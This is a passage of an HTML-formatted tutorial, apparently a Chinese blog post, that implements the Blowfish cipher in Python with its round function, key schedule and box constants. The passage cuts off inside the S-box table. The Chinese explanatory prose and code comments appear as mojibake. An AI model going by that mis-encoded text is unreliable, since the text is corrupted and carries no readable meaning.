class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Encrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br><br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br>        <br><span class="hljs-comment">#æœ€åä¸€è½®ä¸äº¤æ¢ å•ç‹¬å¤„ç† </span><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">17</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">16</span>]<br>    <br>    <span class="hljs-keyword">return</span> Left, Right<br><br></code></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯Fè½®å‡½æ•°ï¼Œå®ƒçš„åŠŸèƒ½å°±æ˜¯æ›¿æ¢ï¼Œä¸‹å›¾å¯ä»¥å¾ˆå¥½çš„è¯´æ˜è¿™ä¸ªæ›¿æ¢è§„åˆ™</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202305292049603.png" alt="20200726213844931"></p><p>ä¸¾ä¸ªæ —å­ï¼Œå‡è®¾æˆ‘ä»¬è¾“å…¥çš„32ä½æ•°æ˜¯0x12345678ï¼Œé‚£ä¹ˆåˆ†æˆ0x12,0x34,0x56,0x78å››ç»„ï¼Œåˆ†åˆ«ä»¥æ­¤ä¸ºç´¢å¼•å»å„è‡ªçš„Sç›’æ‰¾å€¼ï¼Œæ¯”å¦‚0x12å¯¹åº”<code>S[0][0x12]</code>ï¼Œè®°ä¸ºaï¼Œ</p><p>0x34å¯¹åº”<code>S[1][0x34]</code>ï¼Œè®°ä¸ºbï¼Œ</p><p>0x56å¯¹åº”<code>S[2][0x56]</code>ï¼Œè®°ä¸ºcï¼Œ</p><p>0x78å¯¹åº”<code>S[3][0x78]</code>ï¼Œè®°ä¸ºdï¼Œ</p><p>æœ€ç»ˆè¿”å›<code>((a+b)^c+d)</code>çš„ä½32ä½ï¼Œä½œä¸ºæ›¿æ¢åçš„å€¼</p><p>ä»£ç å¯ä»¥æ›´æ˜ç¡®çš„è¯´æ˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fn</span>(<span class="hljs-params">Left</span>):<br>    a = (Left &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span><br>    b = (Left &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt; <span class="hljs-number">16</span><br>    c = (Left &amp; <span class="hljs-number">0x0000ff00</span>) &gt;&gt; <span class="hljs-number">8</span><br>    d = Left &amp; <span class="hljs-number">0x000000ff</span><br><br>    Sa = s_box[<span class="hljs-number">0</span>][a]<br>    Sb = s_box[<span class="hljs-number">1</span>][b]<br>    Sc = s_box[<span class="hljs-number">2</span>][c]<br>    Sd = s_box[<span class="hljs-number">3</span>][d]<br><br>    <span class="hljs-keyword">return</span> (((Sa + Sb) ^ Sc) + Sd) &amp; <span class="hljs-number">0xffffffff</span><br></code></pre></td></tr></table></figure><p>è‡³æ­¤BlowFishåŠ å¯†çš„ç›¸å…³å‡½æ•°éƒ½ä»‹ç»å®Œæ¯•ï¼Œè§£å¯†ä¹Ÿæ˜¯åŒæ ·çš„æµç¨‹ï¼Œå°±ä¸å†èµ˜è¿°ï¼Œå”¯ä¸€è¦æ³¨æ„çš„å°±æ˜¯åŠ å¯†è¾“å…¥çš„æ˜æ–‡æ˜¯å­—ç¬¦ä¸²ï¼Œè€Œè§£å¯†ä½¿ç”¨çš„å¯†æ–‡åˆ™æ˜¯16è¿›åˆ¶æ•°å­—ï¼Œåœ¨æŠŠä»–ä»¬è½¬åŒ–ä¸º32bitsçš„æ•°æ®æ—¶éœ€è¦ç•™å¿ƒã€‚</p><p>å†æ¥å›æƒ³ä¸‹æ•´ä¸ªåŠ å¯†æµç¨‹,é¦–å…ˆè¾“å…¥å¯†é’¥ï¼Œåˆ©ç”¨å¯†é’¥å¯¹Pç›’ Sç›’åŠ å¯†å˜åŒ–ï¼Œåˆ©ç”¨åŠ å¯†åçš„Pç›’ Sç›’ï¼Œå†å°†æ˜æ–‡æŒ‰64bitsåˆ†ç»„åŠ å¯†</p><p>å®Œæ•´ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> Crypto.Util.number<br><span class="hljs-keyword">import</span> copy<br><span class="hljs-keyword">from</span> Blow_BOX <span class="hljs-keyword">import</span> *<br><br>key_pbox = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>)]<br>Encrypt = []<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_key_pbox</span>(<span class="hljs-params">_key</span>):<br>    index = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            key_pbox[i] = <span class="hljs-built_in">ord</span>(_key[index]) | (key_pbox[i] &lt;&lt; <span class="hljs-number">8</span>)<br>            index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> index &gt;= <span class="hljs-built_in">len</span>(_key):<br>                index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>        p_box[i] ^= key_pbox[i]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fn</span>(<span class="hljs-params">Left</span>):<br>    a = (Left &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span><br>    b = (Left &amp; <span class="hljs-number">0x00ff0000</span>) &gt;&gt; <span class="hljs-number">16</span><br>    c = (Left &amp; <span class="hljs-number">0x0000ff00</span>) &gt;&gt; <span class="hljs-number">8</span><br>    d = Left &amp; <span class="hljs-number">0x000000ff</span><br><br>    Sa = s_box[<span class="hljs-number">0</span>][a]<br>    Sb = s_box[<span class="hljs-number">1</span>][b]<br>    Sc = s_box[<span class="hljs-number">2</span>][c]<br>    Sd = s_box[<span class="hljs-number">3</span>][d]<br><br>    <span class="hljs-keyword">return</span> (((Sa + Sb) ^ Sc) + Sd) &amp; <span class="hljs-number">0xffffffff</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Encrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">17</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">16</span>]<br>    <span class="hljs-keyword">return</span> Left, Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Blow_Main_Decrypt</span>(<span class="hljs-params">Left, Right</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        Left ^= p_box[i]<br>        Right ^= Fn(Left)<br><br>        Temp = Left<br>        Left = Right<br>        Right = Temp<br><br>    Temp = Left<br>    Left = Right ^ p_box[<span class="hljs-number">0</span>]<br>    Right = Temp ^ p_box[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> Left , Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Change_Box</span>():<br>    Left = <span class="hljs-number">0</span><br>    Right = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>):<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        p_box[i] = Left<br>        p_box[i + <span class="hljs-number">1</span>] = Right<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>):<br>            Left, Right = Blow_Main_Encrypt(Left, Right)<br>            s_box[i][j] = Left<br>            s_box[i][j + <span class="hljs-number">1</span>] = Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Encrypt</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">8</span>:<br>        data += <span class="hljs-string">&#x27;0&#x27;</span><br>    cipher = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">8</span>):<br>        Left = (<span class="hljs-built_in">ord</span>(data[i]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">3</span>]))<br>        Right = (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">5</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">6</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">7</span>]))<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        cipher += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        cipher += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">global</span> Encrypt<br>    Encrypt = []<br>    <span class="hljs-built_in">print</span>(cipher)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Decrypt</span>(<span class="hljs-params">cipher</span>):<br>    plain = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">16</span>):<br>        Left = cipher[i:i + <span class="hljs-number">8</span>]<br>        Right = cipher[i + <span class="hljs-number">8</span>:i + <span class="hljs-number">16</span>]<br>        Left = <span class="hljs-built_in">int</span>(Left, base=<span class="hljs-number">16</span>)<br>        Right = <span class="hljs-built_in">int</span>(Right, base=<span class="hljs-number">16</span>)<br><br>        Left, Right = Blow_Main_Decrypt(Left, Right)<br>        plain += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        plain += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br><br>    plain = <span class="hljs-built_in">int</span>(plain, base=<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(Crypto.Util.number.long_to_bytes(plain))<br>    <span class="hljs-keyword">global</span> Encrypt<br>    Encrypt = []<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ input the key First\n&quot;</span>)<br>    init_key_pbox(key)<br>    Change_Box()<br>    m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\n&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ input the data:\n&quot;</span>)<br>            BlowFish_Encrypt(data)<br>            m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            cipher = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ input the cipher:\n&quot;</span>)<br>            BlowFish_Decrypt(cipher)<br>            m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\n&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>Blow_Box</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs python">p_box = [<br>    <span class="hljs-number">0x243F6A88</span>, <span class="hljs-number">0x85A308D3</span>, <span class="hljs-number">0x13198A2E</span>, <span class="hljs-number">0x03707344</span>,<br>    <span class="hljs-number">0xA4093822</span>, <span class="hljs-number">0x299F31D0</span>, <span class="hljs-number">0x082EFA98</span>, <span class="hljs-number">0xEC4E6C89</span>,<br>    <span class="hljs-number">0x452821E6</span>, <span class="hljs-number">0x38D01377</span>, <span class="hljs-number">0xBE5466CF</span>, <span class="hljs-number">0x34E90C6C</span>,<br>    <span class="hljs-number">0xC0AC29B7</span>, <span class="hljs-number">0xC97C50DD</span>, <span class="hljs-number">0x3F84D5B5</span>, <span class="hljs-number">0xB5470917</span>,<br>    <span class="hljs-number">0x9216D5D9</span>, <span class="hljs-number">0x8979FB1B</span>]<br><br>s_box = [<br>    [<span class="hljs-number">0xD1310BA6</span>, <span class="hljs-number">0x98DFB5AC</span>, <span class="hljs-number">0x2FFD72DB</span>, <span class="hljs-number">0xD01ADFB7</span>,<br>     <span class="hljs-number">0xB8E1AFED</span>, <span class="hljs-number">0x6A267E96</span>, <span class="hljs-number">0xBA7C9045</span>, <span class="hljs-number">0xF12C7F99</span>,<br>     <span class="hljs-number">0x24A19947</span>, <span class="hljs-number">0xB3916CF7</span>, <span class="hljs-number">0x0801F2E2</span>, <span class="hljs-number">0x858EFC16</span>,<br>     <span class="hljs-number">0x636920D8</span>, <span class="hljs-number">0x71574E69</span>, <span class="hljs-number">0xA458FEA3</span>, <span class="hljs-number">0xF4933D7E</span>,<br>     <span class="hljs-number">0x0D95748F</span>, <span class="hljs-number">0x728EB658</span>, <span class="hljs-number">0x718BCD58</span>, <span class="hljs-number">0x82154AEE</span>,<br>     <span class="hljs-number">0x7B54A41D</span>, <span class="hljs-number">0xC25A59B5</span>, <span class="hljs-number">0x9C30D539</span>, <span class="hljs-number">0x2AF26013</span>,<br>     <span class="hljs-number">0xC5D1B023</span>, <span class="hljs-number">0x286085F0</span>, <span class="hljs-number">0xCA417918</span>, <span class="hljs-number">0xB8DB38EF</span>,<br>     <span class="hljs-number">0x8E79DCB0</span>, <span class="hljs-number">0x603A180E</span>, <span class="hljs-number">0x6C9E0E8B</span>, <span class="hljs-number">0xB01E8A3E</span>,<br>     <span class="hljs-number">0xD71577C1</span>, <span class="hljs-number">0xBD314B27</span>, <span class="hljs-number">0x78AF2FDA</span>, <span class="hljs-number">0x55605C60</span>,<br>     <span class="hljs-number">0xE65525F3</span>, <span class="hljs-number">0xAA55AB94</span>, <span class="hljs-number">0x57489862</span>, <span class="hljs-number">0x63E81440</span>,<br>     <span class="hljs-number">0x55CA396A</span>, <span class="hljs-number">0x2AAB10B6</span>, <span class="hljs-number">0xB4CC5C34</span>, <span class="hljs-number">0x1141E8CE</span>,<br>     <span class="hljs-number">0xA15486AF</span>, <span class="hljs-number">0x7C72E993</span>, <span class="hljs-number">0xB3EE1411</span>, <span class="hljs-number">0x636FBC2A</span>,<br>     <span class="hljs-number">0x2BA9C55D</span>, <span class="hljs-number">0x741831F6</span>, <span class="hljs-number">0xCE5C3E16</span>, <span class="hljs-number">0x9B87931E</span>,<br>     <span class="hljs-number">0xAFD6BA33</span>, <span class="hljs-number">0x6C24CF5C</span>, <span class="hljs-number">0x7A325381</span>, <span class="hljs-number">0x28958677</span>,<br>     <span class="hljs-number">0x3B8F4898</span>, <span class="hljs-number">0x6B4BB9AF</span>, <span class="hljs-number">0xC4BFE81B</span>, <span class="hljs-number">0x66282193</span>,<br>     <span class="hljs-number">0x61D809CC</span>, <span class="hljs-number">0xFB21A991</span>, <span class="hljs-number">0x487CAC60</span>, <span class="hljs-number">0x5DEC8032</span>,<br>     <span class="hljs-number">0xEF845D5D</span>, <span class="hljs-number">0xE98575B1</span>, <span class="hljs-number">0xDC262302</span>, <span class="hljs-number">0xEB651B88</span>,<br>     <span class="hljs-number">0x23893E81</span>, <span class="hljs-number">0xD396ACC5</span>, <span class="hljs-number">0x0F6D6FF3</span>, <span class="hljs-number">0x83F44239</span>,<br>     <span class="hljs-number">0x2E0B4482</span>, <span class="hljs-number">0xA4842004</span>, <span class="hljs-number">0x69C8F04A</span>, <span class="hljs-number">0x9E1F9B5E</span>,<br>     <span class="hljs-number">0x21C66842</span>, <span class="hljs-number">0xF6E96C9A</span>, <span class="hljs-number">0x670C9C61</span>, <span class="hljs-number">0xABD388F0</span>,<br>     <span class="hljs-number">0x6A51A0D2</span>, <span class="hljs-number">0xD8542F68</span>, <span class="hljs-number">0x960FA728</span>, <span class="hljs-number">0xAB5133A3</span>,<br>     <span class="hljs-number">0x6EEF0B6C</span>, <span class="hljs-number">0x137A3BE4</span>, <span class="hljs-number">0xBA3BF050</span>, <span class="hljs-number">0x7EFB2A98</span>,<br>     <span class="hljs-number">0xA1F1651D</span>, <span class="hljs-number">0x39AF0176</span>, <span class="hljs-number">0x66CA593E</span>, <span class="hljs-number">0x82430E88</span>,<br>     <span class="hljs-number">0x8CEE8619</span>, <span class="hljs-number">0x456F9FB4</span>, <span class="hljs-number">0x7D84A5C3</span>, <span class="hljs-number">0x3B8B5EBE</span>,<br>     <span class="hljs-number">0xE06F75D8</span>, <span class="hljs-number">0x85C12073</span>, <span class="hljs-number">0x401A449F</span>, <span class="hljs-number">0x56C16AA6</span>,<br>     <span class="hljs-number">0x4ED3AA62</span>, <span class="hljs-number">0x363F7706</span>, <span class="hljs-number">0x1BFEDF72</span>, <span class="hljs-number">0x429B023D</span>,<br>     <span class="hljs-number">0x37D0D724</span>, <span class="hljs-number">0xD00A1248</span>, <span class="hljs-number">0xDB0FEAD3</span>, <span class="hljs-number">0x49F1C09B</span>,<br>     <span class="hljs-number">0x075372C9</span>, <span class="hljs-number">0x80991B7B</span>, <span class="hljs-number">0x25D479D8</span>, <span class="hljs-number">0xF6E8DEF7</span>,<br>     <span class="hljs-number">0xE3FE501A</span>, <span class="hljs-number">0xB6794C3B</span>, <span class="hljs-number">0x976CE0BD</span>, <span class="hljs-number">0x04C006BA</span>,<br>     <span class="hljs-number">0xC1A94FB6</span>, <span class="hljs-number">0x409F60C4</span>, <span class="hljs-number">0x5E5C9EC2</span>, <span class="hljs-number">0x196A2463</span>,<br>     <span class="hljs-number">0x68FB6FAF</span>, <span class="hljs-number">0x3E6C53B5</span>, <span class="hljs-number">0x1339B2EB</span>, <span class="hljs-number">0x3B52EC6F</span>,<br>     <span class="hljs-number">0x6DFC511F</span>, <span class="hljs-number">0x9B30952C</span>, <span class="hljs-number">0xCC814544</span>, <span class="hljs-number">0xAF5EBD09</span>,<br>     <span class="hljs-number">0xBEE3D004</span>, <span class="hljs-number">0xDE334AFD</span>, <span class="hljs-number">0x660F2807</span>, <span class="hljs-number">0x192E4BB3</span>,<br>     <span class="hljs-number">0xC0CBA857</span>, <span class="hljs-number">0x45C8740F</span>, <span class="hljs-number">0xD20B5F39</span>, <span class="hljs-number">0xB9D3FBDB</span>,<br>     <span class="hljs-number">0x5579C0BD</span>, <span class="hljs-number">0x1A60320A</span>, <span class="hljs-number">0xD6A100C6</span>, <span class="hljs-number">0x402C7279</span>,<br>     <span class="hljs-number">0x679F25FE</span>, <span class="hljs-number">0xFB1FA3CC</span>, <span class="hljs-number">0x8EA5E9F8</span>, <span 